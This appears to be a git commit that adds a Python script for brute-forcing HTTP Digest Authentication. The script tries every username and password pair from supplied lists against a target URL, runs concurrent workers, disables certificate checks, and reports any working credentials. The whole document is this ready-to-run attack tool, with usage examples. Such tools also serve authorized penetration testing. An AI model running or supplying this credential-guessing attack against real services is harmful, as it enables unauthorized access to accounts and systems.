8dceb0036c597dd7d5b43a39c10caa7fd7c4180e
Name Redacted <info@blackhats.today>
2019-04-07 17:31:53 -0400

    Asyncio + Requests to bruteforce HTTP Digest Authentication
    Initial Upload

---
+++ HTTP/digest_auth.py
@@ -0,0 +1,104 @@
+import itertools
+import requests
+import asyncio
+
+from pathlib import Path
+from requests.auth import HTTPDigestAuth
+from concurrent.futures import ThreadPoolExecutor
+
+requests.packages.urllib3.disable_warnings()
+
+
+class DigestAuth:
+
+    def __init__(self, url, user_list, pass_list, workers):
+        self.url = url
+        self.user_list = self._return_str_or_list(user_list)
+        self.pass_list = self._return_str_or_list(pass_list)
+        self.workers = workers
+
+    @staticmethod
+    def _return_str_or_list(item):
+        if not item:
+            return None
+        stub = []
+        config = Path(item)
+        if config.is_file():
+            for x in open(item):
+                stub.append(x.rstrip())
+            return stub
+        else:
+            return str(item).rstrip()
+
+    def fetch(self, session, auth):
+        with session.get(self.url, auth=HTTPDigestAuth(auth[0], auth[1]), verify=False) as response:
+            if response.status_code == 200:
+                print(f"Credentials Found!  {auth[0]} {auth[1]}")
+
+    async def get_data_asynchronous(self):
+        queue = []
+        for u, p in itertools.product(self.user_list, self.pass_list):
+            queue.append((u, p))
+        with ThreadPoolExecutor(max_workers=int(self.workers)) as executor:
+            with requests.Session() as session:
+                loop = asyncio.get_event_loop()
+                tasks = [
+                    loop.run_in_executor(
+                        executor,
+                        self.fetch,
+                        *(session, auth)
+                    )
+                    for auth in queue
+                ]
+                for _ in await asyncio.gather(*tasks):
+                    pass
+
+
+def usage():
+    u = """
+    USAGE:
+      {} -h "http://127.0.0.1" -u "admin" -p /tmp/passwords.txt
+      {} -h "http://127.0.0.1" -u /tmp/users.txt -p /tmp/passwords.txt
+      {} -h "http://127.0.0.1" -u /tmp/users.txt -p /tmp/passwords.txt -w 20
+
+    OPTIONS:
+      '-h', '--host'       - Set the URL target with Basic Auth login form.
+      '-u', '--users'      - Set the username or path to file containing users.
+      '-p', '--passwords'  - Set the password or path to file containing passwords.
+      '-w', '--workers'    - Set the number of workers to run during attempts.
+
+    """
+    print(u)
+
+
+if __name__ == "__main__":
+    import argparse
+    parser = argparse.ArgumentParser(add_help=False, usage=usage)
+    parser.add_argument('-h', '--host', action='store', dest='host', default='')
+    parser.add_argument('-u', '--users', action='store', dest='users', default='')
+    parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
+    parser.add_argument('-w', '--workers', action='store', dest='workers', default='')
+    arg = None
+
+    try:
+        arg = parser.parse_args()
+    except TypeError:
+        usage()
+        exit("Invalid options provided. Exiting.")
+
+    if not arg.host or not arg.users or not arg.passwords:
+        usage()
+        exit("Required options not provided. Exiting.")
+
+    if not arg.workers:
+        arg.workers = 10
+
+    print("\nStarting Authentication Bruteforce")
+    print(f"[Target URL]: {arg.host}")
+    print(f"[Workers Initiated]: {arg.workers}\n")
+
+    obj = DigestAuth(arg.host, arg.users, arg.passwords, arg.workers)
+
+    loop = asyncio.get_event_loop()
+    future = asyncio.ensure_future(obj.get_data_asynchronous())
+    loop.run_until_complete(future)
